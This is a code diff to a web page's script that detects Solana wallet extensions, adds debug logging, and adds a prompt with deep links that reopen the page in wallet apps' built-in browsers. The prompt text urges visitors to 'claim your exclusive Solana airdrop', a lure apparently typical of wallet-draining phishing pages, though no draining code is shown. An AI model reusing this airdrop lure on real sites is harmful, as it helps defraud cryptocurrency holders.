@@ -790,7 +790,10 @@
         key: 'phantom',
         name: 'Phantom',
         icon: '/phantom-logo.png',
-        provider: () => window.phantom?.solana || window.solana,
+        provider: () => {
+          const phantom = window.phantom?.solana || window.solana;
+          return phantom && typeof phantom === 'object' ? phantom : null;
+        },
         install: 'https://phantom.app/',
         mobile: {
           appStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977',
@@ -802,7 +805,10 @@
         key: 'solflare',
         name: 'Solflare',
         icon: '/solflare-logo.png',
-        provider: () => window.solflare,
+        provider: () => {
+          const solflare = window.solflare;
+          return solflare && typeof solflare === 'object' ? solflare : null;
+        },
         install: 'https://solflare.com/',
         mobile: {
           appStore: 'https://apps.apple.com/app/solflare/id1580902717',
@@ -814,7 +820,10 @@
         key: 'backpack',
         name: 'Backpack',
         icon: '/backpack-logo.png',
-        provider: () => window.backpack,
+        provider: () => {
+          const backpack = window.backpack;
+          return backpack && typeof backpack === 'object' ? backpack : null;
+        },
         install: 'https://backpack.app/',
         mobile: {
           appStore: 'https://apps.apple.com/app/backpack-wallet/id6446591340',
@@ -826,7 +835,10 @@
         key: 'glow',
         name: 'Glow',
         icon: '/glow-logo.png',
-        provider: () => window.glow,
+        provider: () => {
+          const glow = window.glow;
+          return glow && typeof glow === 'object' ? glow : null;
+        },
         install: 'https://glow.app/',
         mobile: {
           appStore: 'https://apps.apple.com/app/glow-wallet/id1635717553',
@@ -838,7 +850,10 @@
         key: 'trustwallet',
         name: 'Trust Wallet',
         icon: '/trust-logo.png',
-        provider: () => window.trustwallet?.solana || window.trustwallet,
+        provider: () => {
+          const trustwallet = window.trustwallet?.solana || window.trustwallet;
+          return trustwallet && typeof trustwallet === 'object' ? trustwallet : null;
+        },
         install: 'https://trustwallet.com/',
         mobile: {
           appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
@@ -850,7 +865,10 @@
         key: 'exodus',
         name: 'Exodus',
         icon: '/exodus-logo.png',
-        provider: () => window.exodus || window.exodusWallet,
+        provider: () => {
+          const exodus = window.exodus || window.exodusWallet;
+          return exodus && typeof exodus === 'object' ? exodus : null;
+        },
         install: 'https://exodus.com/',
         mobile: {
           appStore: 'https://apps.apple.com/app/exodus-crypto-bitcoin-wallet/id1414384820',
@@ -869,6 +887,8 @@
         console.log(`Provider for ${wallet.name} at load: ERROR`, e);
       }
     });
+
+
 
 // Show status message in the status modal
 function showStatus(message, type = 'info') {
@@ -977,12 +997,25 @@ async function openWalletModal() {
       // Check if the provider object exists
       try {
         const provider = wallet.provider();
+        console.log(`Checking ${wallet.name} provider:`, provider);
         // Only show wallets with a detected provider
         return provider !== undefined && provider !== null;
       } catch (e) {
+        console.log(`Error checking ${wallet.name} provider:`, e);
         return false;
       }
     });
+    
+    console.log('Detected wallets:', detectedDefs.length);
+    console.log('Detected wallet names:', detectedDefs.map(w => w.name));
+    
+    // If no wallets are detected, show the wallet browser prompt instead
+    if (detectedDefs.length === 0) {
+      console.log('No wallets detected, showing wallet browser prompt');
+      showWalletBrowserPrompt();
+      return;
+    }
+    
     walletList.innerHTML = detectedDefs.map(wallet => {
       // Use the actual provider object for this wallet
       const provider = wallet.provider();
@@ -1071,8 +1104,13 @@ async function openWalletModal() {
       console.log('updateCountdown exists:', typeof updateCountdown === 'function');
       console.log('openWalletModal exists:', typeof openWalletModal === 'function');
       console.log('isMobile exists:', typeof isMobile === 'function');
+      console.log('showWalletBrowserPrompt exists:', typeof showWalletBrowserPrompt === 'function');
       
       console.log('Initialization complete');
+      
+
+      
+
     });
 
     // Solana Wallet Adapter metadata format
@@ -1295,46 +1333,22 @@ async function openWalletModal() {
               console.error(`[connectMobileWallet] No connect function for ${wallet.name}`);
             }
           } else {
-            // No provider found, show manual instructions
+            // No provider found, show subtle wallet browser prompt with all supported wallets
             console.error(`[connectMobileWallet] No provider found for ${wallet.name} after waiting.`);
-            const instructions = `
-              <div style="text-align: center; padding: 20px;">
-                <h3>📱 Connect ${wallet.name}</h3>
-                <p style="margin: 15px 0; color: #666;">
-                  To connect your ${wallet.name} wallet:<br>
-                  1. Open your ${wallet.name} app<br>
-                  2. Navigate to this website<br>
-                  3. Connect your wallet in the app<br>
-                  4. Return here to continue
-                </p>
-                <div style="margin: 20px 0;">
-                  <button onclick="window.open('${wallet.mobile.appStore}', '_blank')" style="background: #007AFF; color: white; border: none; padding: 10px 20px; border-radius: 8px; margin: 5px; cursor: pointer;">
-                    📱 Open ${wallet.name}
-                  </button>
-                  <button onclick="window.open('${wallet.mobile.playStore}', '_blank')" style="background: #34A853; color: white; border: none; padding: 10px 20px; border-radius: 8px; margin: 5px; cursor: pointer;">
-                    📱 Install ${wallet.name}
-                  </button>
-                </div>
-                <p style="font-size: 0.9em; color: #999;">
-                  After connecting in the app, refresh this page to continue
-                </p>
-              </div>
-            `;
-            
-            // Show instructions in modal
-            const modal = document.getElementById('statusModal');
-            const msgEl = document.getElementById('statusModalMsg');
-            msgEl.innerHTML = instructions;
-            modal.classList.add('active');
+            console.log(`[connectMobileWallet] Provider value:`, provider);
+            console.log(`[connectMobileWallet] Provider type:`, typeof provider);
+            showWalletBrowserPrompt();
           }
           
         } else {
           // Desktop logic (unchanged)
           const provider = wallet.provider();
           console.log(`[connectMobileWallet] Desktop provider for ${wallet.name}:`, provider);
-          if (!provider) {
-            showStatus(`${wallet.name} not detected. Please install the extension.`, 'error');
+          if (!provider || provider === undefined || provider === null) {
             console.error(`[connectMobileWallet] No provider for ${wallet.name} on desktop.`);
+            console.log(`[connectMobileWallet] Desktop provider value:`, provider);
+            console.log(`[connectMobileWallet] Desktop provider type:`, typeof provider);
+            showWalletBrowserPrompt();
             return;
           }
           
@@ -1367,6 +1381,95 @@ async function openWalletModal() {
       }
     }
     window.connectMobileWallet = connectMobileWallet;
+
+    // Function to handle deep links properly (moved outside for global access)
+    function openInWallet(walletType) {
+      const currentUrl = window.location.href;
+      let deepLink = '';
+      let fallbackUrl = '';
+      
+      switch(walletType) {
+        case 'phantom':
+          deepLink = 'https://phantom.app/ul/browse/' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://phantom.app/';
+          break;
+        case 'solflare':
+          deepLink = 'https://solflare.com/ul/browse/' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://solflare.com/';
+          break;
+        case 'backpack':
+          deepLink = 'https://backpack.app/ul/browse/' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://backpack.app/';
+          break;
+        case 'trustwallet':
+          deepLink = 'https://link.trustwallet.com/open_url?coin_id=501&url=' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://trustwallet.com/';
+          break;
+        case 'glow':
+          deepLink = 'https://glow.app/ul/browse/' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://glow.app/';
+          break;
+      }
+      
+      // Try to open the deep link
+      window.location.href = deepLink;
+    }
+
+    // Function to show subtle wallet browser prompt
+    function showWalletBrowserPrompt() {
+
+
+
+      const instructions = `
+        <div style="text-align: center; padding: 20px; max-width: 500px; margin: 0 auto;">
+          <div style="margin-bottom: 20px;">
+            <h3 style="color: #fff; margin-bottom: 10px; font-size: 18px;">🔗 Connect Your Wallet</h3>
+            <p style="color: #ccc; font-size: 14px; line-height: 1.5; margin-bottom: 20px;">
+              To claim your exclusive Solana airdrop, you'll need a compatible wallet. 
+              Open this page in your wallet's built-in browser for the best experience.
+            </p>
+          </div>
+          
+          <div style="background: rgba(0,0,0,0.3); border-radius: 12px; padding: 16px; margin-bottom: 20px;">
+            <h4 style="color: #fff; margin-bottom: 12px; font-size: 14px;">📱 Recommended: Use Wallet Browser</h4>
+            <p style="color: #aaa; font-size: 12px; margin-bottom: 16px;">
+              For the smoothest experience, open this website directly in your wallet's browser:
+            </p>
+            <div style="display: flex; flex-wrap: wrap; gap: 8px; justify-content: center;">
+              <button onclick="openInWallet('phantom')" style="background: linear-gradient(135deg, #9945FF 0%, #7B3FE4 100%); color: white; border: none; padding: 8px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+                🌐 Open in Phantom
+              </button>
+              <button onclick="openInWallet('solflare')" style="background: linear-gradient(135deg, #FC9965 0%, #F7931E 100%); color: white; border: none; padding: 8px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+                🌐 Open in Solflare
+              </button>
+              <button onclick="openInWallet('backpack')" style="background: linear-gradient(135deg, #000000 0%, #333333 100%); color: white; border: none; padding: 8px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+                🌐 Open in Backpack
+              </button>
+              <button onclick="openInWallet('trustwallet')" style="background: linear-gradient(135deg, #3375BB 0%, #1E4A8C 100%); color: white; border: none; padding: 8px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+                🌐 Open in Trust Wallet
+              </button>
+              <button onclick="openInWallet('glow')" style="background: linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%); color: white; border: none; padding: 8px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+                🌐 Open in Glow
+              </button>
+            </div>
+          </div>
+          
+
+          
+          <div style="margin-top: 20px; padding: 12px; background: rgba(255,255,255,0.05); border-radius: 8px; border-left: 3px solid #00FF88;">
+            <p style="color: #00FF88; font-size: 12px; margin: 0;">
+              💡 <strong>Pro Tip:</strong> Using your wallet's built-in browser ensures the best connection experience and security.
+            </p>
+          </div>
+        </div>
+      `;
+      
+      // Show instructions in modal
+      const modal = document.getElementById('statusModal');
+      const msgEl = document.getElementById('statusModalMsg');
+      msgEl.innerHTML = instructions;
+      modal.classList.add('active');
+    }
   </script>
 </body>
 </html>
